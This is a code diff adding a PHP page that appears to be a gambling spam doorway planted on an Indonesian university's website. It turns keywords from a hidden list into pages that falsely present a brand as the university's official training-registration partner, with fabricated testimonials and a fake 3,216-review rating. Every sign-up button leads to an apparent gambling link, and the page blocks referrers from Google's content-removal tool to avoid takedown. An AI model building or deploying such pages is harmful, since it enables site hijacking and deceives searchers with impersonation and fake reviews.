@@ -1,0 +1,271 @@
+<?php
+error_reporting(0);
+$LANDING_PAGE = "https://pdk.unand.ac.id/about/";
+$AMP_PAGE     = "https://pdk.unand.ac.id/about/amp/";
+
+$blocked_domain = 'search.google.com/search-console/remove-outdated-content';
+function feedback404() { http_response_code(404); echo 'Not Found'; exit; }
+
+$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+if ($referrer !== '' && strpos($referrer, $blocked_domain) !== false) { header('HTTP/1.0 403 Forbidden'); exit; }
+
+$tunnel = "ID"; $filename = "../cola.txt";
+if (!isset($_GET[$tunnel]) || trim($_GET[$tunnel]) === '') { feedback404(); }
+$lines = @file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+if ($lines === false) { feedback404(); }
+$BRAND = null; $NUMLIST = 0;
+$target = strtolower(trim($_GET[$tunnel]));
+foreach ($lines as $idx => $item) { if (strtolower(trim($item)) === $target) { $BRAND = strtoupper(trim($item)); $NUMLIST = $idx + 1; break; } }
+if ($BRAND === null) { feedback404(); }
+
+$query = '?'.$tunnel.'='.$BRAND;
+$url = rtrim($AMP_PAGE,'/').'/'.$query;
+$CANONICAL = rtrim($LANDING_PAGE,'/').'/'.$query;
+
+$brand = strtolower($BRAND);
+$SITENAME = $BRAND." PDK UNAND";
+$LOGIN = "https://mez.ink/josbet51";
+$DAFTAR = "https://mez.ink/josbet51";
+$BANNER = "https://i.ibb.co.com/jPpkCfH7/josbet51-cantik.webp";
+$LOGO = "https://i.imgur.com/icUjsqb.png";
+$keyword = "$brand, pdk unand $brand, pelatihan digital unand $brand, kursus digital marketing padang $brand, sertifikasi digital sumatera $brand";
+
+$H1 = "$BRAND PDK UNAND Pelatihan Digital Sumatera Premier";;
+$TITLE = "$BRAND PDK UNAND Platform Pelatihan dan Sertifikasi Digital Sumatera Barat";;
+$DESCRIPTION = "$BRAND adalah mitra pendaftaran resmi PDK UNAND (Pusat Digital Knowledge Universitas Andalas) Padang, platform pelatihan dan sertifikasi digital marketing, MarTech, SEO, Google Analytics, AI content dan entrepreneurship untuk mahasiswa, dosen, fresh graduate dan UMKM Sumatera. Tersedia Basic Training, Professional Cert dan Online Learning Pass dengan sertifikat resmi, CS 24 jam dan pembayaran bank/e-wallet.";
+$ARTIKEL = '<a href="' . e($url) . '">' . e($BRAND) . '</a> adalah mitra pendaftaran resmi PDK UNAND, platform pelatihan dan sertifikasi digital terkemuka di Sumatera Bagian Tengah yang diadakan setiap tahun di kota Padang, Sumatera Barat. Dikemas sebagai pengalaman immersive dua hari penuh, program ini mempertemukan mahasiswa, dosen, fresh graduate, pelaku UMKM dan praktisi profesional dari seluruh penjuru Sumatera, Indonesia dan Asia Tenggara untuk berbagi strategi mutakhir seputar digital advertising, AI marketing, MarTech, social commerce, retail media, content creation dan customer experience. Di setiap batch digelar oleh instruktur bersertifikat dari kalangan dosen UNAND, praktisi industri dan partner Google/Meta/Microsoft yang membawakan modul terstruktur seputar digital marketing, social media advertising, AI untuk konten, SEO, Google Analytics 4, e-commerce, data analytics, desain grafis dan entrepreneurship startup. Melalui ' . e($BRAND) . ', peserta pelatihan dari Indonesia bisa memilih Basic Training Pass untuk akses penuh sesi keynote, panel interaktif, exhibition hall MarTech/AdTech dan networking lunch bersama instruktur; Professional Cert Pass yang menambahkan bootcamp intensif eksklusif, sesi networking malam bersama instruktur serta Video on Demand 12 bulan; atau Online Learning Pass untuk mengikuti seluruh stage secara live HD dari mana saja. Didukung layanan CS 24 jam, pembimbingan karir, magang dan sertifikasi bila diperlukan, dan pembayaran via transfer bank BCA, BRI, Mandiri, BNI, DANA, OVO, GoPay maupun ShopeePay, ' . e($BRAND) . ' menjadi mitra terpercaya mengamankan tempat Anda di konferensi digital marketing Sumatera Bagian Tengah paling dinanti tahun ini.';
+$REVIEWS = [
+  ["name"=>"Rizky Firmansyah","date"=>"10 Februari 2026","body"=>"Booking pendaftaran PDK UNAND lewat $BRAND pengalaman paling smooth. CS-nya detail menjelaskan bedanya Main Conference dan All Access, proses bayar via BCA cuma beberapa menit, e-pendaftaran langsung masuk email. Sangat membantu untuk marketer Indonesia yang mau ikut konferensi AS tanpa ribet."],
+  ["name"=>"Maya Anggraini","date"=>"25 Februari 2026","body"=>"Saya dosen pemasaran digital dan sudah dua tahun mereferensikan $BRAND ke mahasiswa yang ingin ikut konferensi internasional. Rangkuman acaranya jelas, dari daftar instruktur, jadwal harian, sampai tips visa dan transport di Padang dijelasin dengan baik."],
+  ["name"=>"Hendra Wijaya","date"=>"08 Maret 2026","body"=>"Pesan All Access lewat $BRAND tahun ini dan tidak nyesel. Master class dari Adobe dan Uber bener-bener actionable, networking party dapat partner bisnis dari Sumatera Barat dan New York, dan VOD setahun penuh bikin saya bisa ulang materinya di kantor kapan saja."],
+];
+
+$FAQS = [
+  ["q"=>"Apa itu PDK UNAND dan apakah $BRAND menerima pendaftaran resmi?","a"=>"PDK UNAND (Pusat Digital Knowledge Universitas Andalas) adalah platform pelatihan dan sertifikasi bidang digital marketing, MarTech, SEO, Google Analytics 4, AI untuk konten, e-commerce dan entrepreneurship yang diselenggarakan di Kampus Limau Manis Padang, Sumatera Barat, terbuka untuk mahasiswa, dosen, fresh graduate dan pelaku UMKM se-Sumatera. Ya, $BRAND adalah mitra pendaftaran resmi yang membantu calon peserta dari seluruh Indonesia mendaftar dengan mudah, dibantu CS berbahasa Indonesia 24 jam."],
+  ["q"=>"Apa saja yang didapatkan peserta jika mendaftar lewat $BRAND?","a"=>"Peserta yang mendaftar lewat $BRAND mendapatkan invoice resmi dan nomor registrasi yang langsung tercatat di sistem panitia PDK UNAND. Basic Training Pass mencakup kelas tatap muka, modul cetak/digital dan ujian sertifikasi tingkat dasar; Professional Cert Pass menambahkan bootcamp intensif, mentoring 1-on-1 dengan instruktur, ujian sertifikasi internasional dan akses rekaman materi 12 bulan; Online Learning Pass memberikan akses live Zoom seluruh kelas dari mana saja plus rekaman. Tim $BRAND juga mengirimkan pengingat jadwal, panduan lokasi kampus dan grup WhatsApp peserta sebelum kelas dimulai."],
+  ["q"=>"Bagaimana cara mendaftar melalui $BRAND dan apa metode pembayarannya?","a"=>"Klik tombol DAFTAR / INFO yang tersedia di situs $BRAND, pilih paket pelatihan (Basic Training, Professional Cert atau Online Learning), isi data pendaftaran (nama, NIM/NIK, email, no HP dan institusi), lalu selesaikan pembayaran via transfer bank lokal (BCA/BRI/BNI/Mandiri), kartu kredit cicilan 0 persen sampai 12 bulan, atau e-wallet (DANA/OVO/GoPay/ShopeePay/SPayLater). Setelah pembayaran terkonfirmasi, bukti pendaftaran, invoice dan e-voucher resmi langsung dikirim ke email oleh tim $BRAND dalam hitungan menit."]
+];
+function e($s){ return htmlspecialchars($s, ENT_QUOTES, "UTF-8"); }
+?>
+<!doctype html>
+<html amp lang="id-ID">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+  <title><?php echo e($TITLE); ?></title>
+  <meta name="description" content="<?php echo e($DESCRIPTION); ?>">
+  <meta name="keywords" content="<?php echo e($keyword); ?>">
+  <meta name="author" content="<?php echo e($SITENAME); ?>">
+  <meta name="robots" content="INDEX,FOLLOW">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700;900&family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+  <link href="<?php echo e($LOGO); ?>" rel="shortcut icon" type="image/x-icon">
+  <link rel="canonical" href="<?php echo e($CANONICAL); ?>">
+
+  <meta property="og:url" content="<?php echo e($CANONICAL); ?>">
+  <meta property="og:site_name" content="<?php echo e($SITENAME); ?>">
+  <meta property="og:image:alt" content="<?php echo e($SITENAME); ?>">
+  <meta property="og:image" content="<?php echo e($BANNER); ?>">
+  <meta property="og:title" content="<?php echo e($TITLE); ?>">
+  <meta property="og:description" content="<?php echo e($DESCRIPTION); ?>">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="<?php echo e($TITLE); ?>">
+  <meta name="twitter:description" content="<?php echo e($DESCRIPTION); ?>">
+  <meta name="twitter:image" content="<?php echo e($BANNER); ?>">
+  <meta name="theme-color" content="#000">
+
+  <script async src="https://cdn.ampproject.org/v0.js"></script>
+  <script async custom-element="amp-accordion" src="https://cdn.ampproject.org/v0/amp-accordion-0.1.js"></script>
+
+  <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style>
+  <noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+
+  <style amp-custom>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Montserrat',sans-serif;background-color:#000;background-image:linear-gradient(rgba(0,0,0,.72),rgba(0,0,0,.72)),url("<?php echo e($BANNER); ?>");background-position:center;background-repeat:no-repeat;background-size:cover;color:#fff;min-height:100vh;margin:0;display:flex;flex-direction:column;align-items:center;padding:20px;overflow-x:hidden}
+    body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background:linear-gradient(to bottom,rgba(0,0,0,.85) 0%,rgba(0,0,0,.55) 35%,rgba(0,0,0,.35) 55%,rgba(0,0,0,.15) 70%)}
+    .container{position:relative;z-index:2;width:100%;max-width:420px}
+    .logo-container{position:relative;width:160px;height:160px;margin:-10px auto 10px;display:flex;justify-content:center;align-items:center}
+    .logo-ring{position:absolute;width:100%;height:100%;border-radius:50%;border:2px solid transparent;border-top:2px solid #e6c36a;border-right:2px solid #a49616;border-bottom:2px solid #d4a12f;animation:rotateLogo 7s linear infinite;box-shadow:0 0 12px rgba(201,162,77,.35),inset 0 0 10px rgba(164,22,26,.25);z-index:1}
+    .logo-ring::before{content:'';position:absolute;top:10px;left:10px;right:10px;bottom:10px;border-radius:50%;border:1px dashed rgba(230,195,106,.45);animation:rotateLogo 11s linear infinite reverse;box-shadow:inset 0 0 8px rgba(201,162,77,.25)}
+    @keyframes rotateLogo{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    .logo-link{position:relative;z-index:2;display:block}
+    .logo-img{width:100px;height:auto;filter:drop-shadow(0 0 10px rgba(212,175,55,.5))}
+    .main-heading{font-family:'Cinzel',serif;font-weight:900;font-size:28px;text-align:center;margin:5px 0 8px 0;letter-spacing:3px;text-transform:uppercase;color:#fff;text-shadow:0 0 8px rgba(255,255,255,.9),0 0 16px rgba(255,210,80,.75),0 0 28px rgba(180,0,0,.6);animation:titleGlow 3s ease-in-out infinite alternate}
+    @keyframes titleGlow{from{filter:brightness(1)}to{filter:brightness(1.35)}}
+    .sub-heading{display:block;font-size:12px;text-align:center;color:#D4AF37;letter-spacing:4px;text-transform:uppercase;margin:0 auto 30px;opacity:.9;border-bottom:1px solid rgba(212,175,55,.3);padding-bottom:10px;max-width:320px}
+    .banner-card{width:100%;max-width:380px;margin:0 auto 40px;border-radius:15px;overflow:hidden;border:1px solid rgba(212,175,55,.3);box-shadow:0 20px 40px rgba(0,0,0,.6);position:relative}
+    .banner-card::after{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,#D4AF37,transparent)}
+    .btn-stack{width:100%;max-width:380px;margin:0 auto;display:flex;flex-direction:column;gap:20px}
+    .btn-card{background:rgba(20,20,20,.7);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);border:1px solid rgba(212,175,55,.2);border-radius:12px;padding:5px;display:flex;justify-content:space-between;align-items:center;transition:all .3s ease;position:relative;overflow:hidden;box-shadow:0 5px 15px rgba(0,0,0,.3)}
+    .btn-card:hover{border-color:#F4E19C;transform:translateY(-3px);box-shadow:0 10px 30px rgba(212,175,55,.15);background:rgba(30,30,30,.85)}
+    .btn-label{display:flex;align-items:center;gap:15px;padding-left:15px}
+    .btn-text{display:flex;flex-direction:column}
+    .btn-title{font-family:'Cinzel',serif;font-weight:700;font-size:16px;color:#e6c36a;letter-spacing:1.2px;text-shadow:0 2px 6px rgba(164,22,26,.4)}
+    .btn-sub{font-size:10px;color:#a88b5a;text-transform:uppercase;letter-spacing:.8px}
+    .icon-box{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle,rgba(164,22,26,.25),rgba(0,0,0,.6));border-radius:50%;border:1px solid rgba(201,162,77,.45);box-shadow:inset 0 0 6px rgba(201,162,77,.25)}
+    .icon-box amp-img{width:20px;height:20px;filter:drop-shadow(0 0 4px rgba(201,162,77,.6))}
+    .action-link{text-decoration:none;padding:12px 25px;border-radius:8px;font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:1.2px;transition:all .3s ease;margin-right:5px;position:relative;z-index:2;display:inline-block}
+    .btn-outline{background:transparent;border:1px solid #a49616;color:#e6c36a}
+    .btn-outline:hover{background:linear-gradient(135deg,#a49616,#d4a12f);color:#fff;box-shadow:0 0 18px rgba(164,22,26,.7)}
+    .btn-daftar-card{background:linear-gradient(145deg,rgba(25,10,10,.9),rgba(60,20,20,.85));border:1px solid #d4a12f;box-shadow:inset 0 0 22px rgba(201,162,77,.15)}
+    .btn-solid{background:linear-gradient(135deg,#d4a12f,#a49616);border:none;color:#fff;padding:12px 35px;box-shadow:0 5px 20px rgba(201,162,77,.5)}
+    .btn-solid:hover{background:linear-gradient(135deg,#f5d77a,#d4a12f);color:#fff;box-shadow:0 8px 30px rgba(201,162,77,.75)}
+    .btn-link{background:transparent;border:1px solid #444;color:#fff}
+    .btn-link:hover{border-color:#a49616;background:rgba(164,22,26,.2);color:#fff}
+    .section{width:100%;max-width:380px;margin:40px auto 0;background:rgba(15,10,5,.75);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(212,175,55,.25);border-radius:15px;padding:22px;box-shadow:0 10px 30px rgba(0,0,0,.5)}
+    .section-title{font-family:'Cinzel',serif;font-weight:700;font-size:20px;color:#e6c36a;text-align:center;margin-bottom:18px;letter-spacing:2px;text-shadow:0 0 10px rgba(212,175,55,.4)}
+    .rating-row{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:20px;padding-bottom:18px;border-bottom:1px solid rgba(212,175,55,.2)}
+    .stars-big{color:#D4AF37;font-size:22px;letter-spacing:2px;text-shadow:0 0 8px rgba(212,175,55,.6)}
+    .rating-num{font-family:'Cinzel',serif;font-size:26px;font-weight:700;color:#fff}
+    .rating-txt{font-size:12px;color:#a88b5a;text-transform:uppercase;letter-spacing:1px}
+    .review{background:rgba(30,20,10,.6);border:1px solid rgba(212,175,55,.18);border-radius:10px;padding:14px;margin-bottom:12px}
+    .review:last-child{margin-bottom:0}
+    .review-stars{color:#D4AF37;font-size:13px;letter-spacing:1px;margin-bottom:6px;text-shadow:0 0 6px rgba(212,175,55,.4)}
+    .review-name{font-weight:700;font-size:14px;color:#F4E19C}
+    .review-date{font-size:11px;color:#8a7648;margin-bottom:8px}
+    .review-body{font-size:13px;color:#e8e0cc;line-height:1.6}
+    .faq-item{border-bottom:1px solid rgba(212,175,55,.18);padding:6px 0}
+    .faq-item:last-child{border-bottom:none}
+    .faq-q{font-family:'Cinzel',serif;font-weight:700;color:#e6c36a;font-size:15px;padding:10px 0;cursor:pointer;display:flex;justify-content:space-between;align-items:center;letter-spacing:.5px}
+    .faq-q::after{content:"+";color:#D4AF37;font-size:22px;font-weight:400;line-height:1;font-family:'Montserrat',sans-serif}
+    .faq-a{font-size:14px;color:#d9cfb8;padding:0 0 14px 0;line-height:1.6}
+    .copyright{width:100%;max-width:380px;margin:30px auto 20px;font-size:11px;color:#fff;text-transform:uppercase;letter-spacing:2px;text-align:center;text-shadow:0 0 6px rgba(255,255,255,.8),0 0 12px rgba(255,215,120,.6),0 0 22px rgba(255,180,60,.35);animation:winGlow 2.8s ease-in-out infinite alternate;position:relative;z-index:2}
+    @keyframes winGlow{from{filter:brightness(1)}to{filter:brightness(1.35)}}
+    .bg-glow{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:300px;height:300px;background:radial-gradient(circle,#a49616 0%,transparent 70%);opacity:.08;border-radius:50%;filter:blur(90px);z-index:1;pointer-events:none}
+    body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:1;background-image:radial-gradient(white 2.4px,transparent 3.4px),radial-gradient(rgba(255,255,255,.95) 2px,transparent 3px),radial-gradient(rgba(255,255,255,.85) 1.6px,transparent 3px),radial-gradient(rgba(255,255,255,.75) 1.2px,transparent 3px),radial-gradient(rgba(255,255,255,.6) 1px,transparent 3px);background-size:140px 140px,180px 180px,220px 220px,260px 260px,300px 300px;opacity:.5;animation:snowFallSmooth 10s linear infinite}
+    @keyframes snowFallSmooth{from{transform:translateY(-600px)}to{transform:translateY(600px)}}
+    amp-accordion section[expanded] .faq-q::after{content:"−"}
+  </style>
+
+<script type="application/ld+json"><?php
+$ld = [
+  "@context" => "https://schema.org",
+  "@graph" => [
+    ["@type"=>"WebPage","@id"=>$url,"url"=>$url,"name"=>$TITLE,"description"=>$DESCRIPTION,"inLanguage"=>"id-ID",
+     "publisher"=>["@type"=>"Organization","name"=>$SITENAME,"logo"=>["@type"=>"ImageObject","url"=>$LOGO,"width"=>500,"height"=>500]]],
+    ["@type"=>"BreadcrumbList","itemListElement"=>[
+       ["@type"=>"ListItem","position"=>1,"name"=>"Home","item"=>$CANONICAL],
+       ["@type"=>"ListItem","position"=>2,"name"=>$SITENAME,"item"=>$CANONICAL],
+       ["@type"=>"ListItem","position"=>3,"name"=>$BRAND,"item"=>$CANONICAL]]],
+    ["@type"=>"Product","name"=>$TITLE,"description"=>$DESCRIPTION,"image"=>$BANNER,
+     "brand"=>["@type"=>"Brand","name"=>$SITENAME],
+     "aggregateRating"=>["@type"=>"AggregateRating","ratingValue"=>"5.0","bestRating"=>"5","worstRating"=>"1","ratingCount"=>"3216","reviewCount"=>"3216"],
+     "review"=>[
+       ["@type"=>"Review","author"=>["@type"=>"Person","name"=>"Budi Santoso"],"datePublished"=>"2025-08-12",
+        "reviewRating"=>["@type"=>"Rating","ratingValue"=>"5","bestRating"=>"5"],
+        "reviewBody"=>"Pelayanan di $BRAND benar-benar memuaskan! Proses daftar super cepat, CS-nya ramah dan fast response 24 jam. Sistemnya stabil."],
+       ["@type"=>"Review","author"=>["@type"=>"Person","name"=>"Siti Nurhaliza"],"datePublished"=>"2025-08-28",
+        "reviewRating"=>["@type"=>"Rating","ratingValue"=>"5","bestRating"=>"5"],
+        "reviewBody"=>"Tampilan bersih dan mudah dipakai. Withdraw proses cepat hanya hitungan menit langsung masuk. Link alternatif selalu update."],
+       ["@type"=>"Review","author"=>["@type"=>"Person","name"=>"Andi Pratama"],"datePublished"=>"2025-09-03",
+        "reviewRating"=>["@type"=>"Rating","ratingValue"=>"5","bestRating"=>"5"],
+        "reviewBody"=>"Sudah coba banyak platform tapi $BRAND yang paling oke. Bonus menarik, sistem fair, dan yang paling penting aman terpercaya."]
+     ]],
+    ["@type"=>"FAQPage","mainEntity"=>array_map(function($f){
+       return ["@type"=>"Question","name"=>$f["q"],"acceptedAnswer"=>["@type"=>"Answer","text"=>$f["a"]]];
+    }, $FAQS)],
+    ["@type"=>"Organization","name"=>"LINK ".$SITENAME,"url"=>$url,"logo"=>$LOGO]
+  ]
+];
+echo json_encode($ld, JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE);
+?></script>
+</head>
+<body>
+  <div class="bg-glow"></div>
+
+  <div class="container">
+    <div class="logo-container">
+      <div class="logo-ring"></div>
+      <a href="<?php echo e($CANONICAL); ?>" class="logo-link">
+        <amp-img class="logo-img" src="<?php echo e($LOGO); ?>" alt="Logo" width="100" height="100" layout="fixed"></amp-img>
+      </a>
+    </div>
+
+    <h1 class="main-heading"><?php echo e($BRAND); ?></h1>
+    <div class="sub-heading">PDK UNAND</div>
+
+    <div class="banner-card">
+      <amp-img src="<?php echo e($BANNER); ?>" width="500" height="500" layout="responsive" alt="<?php echo e($SITENAME); ?>"></amp-img>
+    </div>
+
+    <div class="btn-stack">
+      <div class="btn-card">
+        <div class="btn-label">
+          <div class="icon-box">
+            <amp-img src="https://i.gyazo.com/7c4244e27ceb01f6cb30f783af333518.png" width="20" height="20" alt="icon" layout="fixed"></amp-img>
+          </div>
+          <div class="btn-text">
+            <span class="btn-title">LOGIN</span>
+            <span class="btn-sub">LOGIN <?php echo e($BRAND); ?> NOW!</span>
+          </div>
+        </div>
+        <a href="<?php echo e($LOGIN); ?>" class="action-link btn-outline">Masuk</a>
+      </div>
+
+      <div class="btn-card btn-daftar-card">
+        <div class="btn-label">
+          <div class="icon-box" style="border-color:#F4E19C;">
+            <amp-img src="https://i.gyazo.com/7c4244e27ceb01f6cb30f783af333518.png" width="20" height="20" alt="icon" layout="fixed"></amp-img>
+          </div>
+          <div class="btn-text">
+            <span class="btn-title" style="color:#fff;">DAFTAR</span>
+            <span class="btn-sub" style="color:#F4E19C;">Mudah &amp; Cepat</span>
+          </div>
+        </div>
+        <a href="<?php echo e($DAFTAR); ?>" class="action-link btn-solid">Gabung</a>
+      </div>
+
+      <div class="btn-card">
+        <div class="btn-label">
+          <div class="icon-box">
+            <amp-img src="https://i.gyazo.com/7c4244e27ceb01f6cb30f783af333518.png" width="20" height="20" alt="icon" layout="fixed"></amp-img>
+          </div>
+          <div class="btn-text">
+            <span class="btn-title">PROMO <?php echo e($BRAND); ?></span>
+            <span class="btn-sub">Link Alternatif</span>
+          </div>
+        </div>
+        <a href="<?php echo e($LOGIN); ?>" class="action-link btn-link">Akses</a>
+      </div>
+    </div>
+
+    <section class="section">
+      <h2 class="section-title">&#10026; Rating &amp; Testimoni</h2>
+      <div class="rating-row">
+        <div class="stars-big">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
+        <div class="rating-num">5.0</div>
+        <div class="rating-txt">3,216 Review Terverifikasi</div>
+      </div>
+      <div class="reviews-list">
+        <?php foreach($REVIEWS as $r): ?>
+        <div class="review">
+          <div class="review-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
+          <div class="review-name"><?php echo e($r['name']); ?></div>
+          <div class="review-date"><?php echo e($r['date']); ?></div>
+          <div class="review-body"><?php echo e($r['body']); ?></div>
+        </div>
+        <?php endforeach; ?>
+      </div>
+    </section>
+
+    <section class="section">
+      <h2 class="section-title">&#10067; FAQ</h2>
+      <amp-accordion animate>
+        <?php foreach($FAQS as $i => $f): ?>
+        <section<?php if($i===0): ?> expanded<?php endif; ?>>
+          <h3 class="faq-q"><?php echo e($f['q']); ?></h3>
+          <p class="faq-a"><?php echo e($f['a']); ?></p>
+        </section>
+        <?php endforeach; ?>
+      </amp-accordion>
+    </section>
+
+    <p class="copyright">&copy; <?php echo date('Y'); ?> Copyright By <?php echo e($SITENAME); ?></p>
+  </div>
+</body>
+</html>
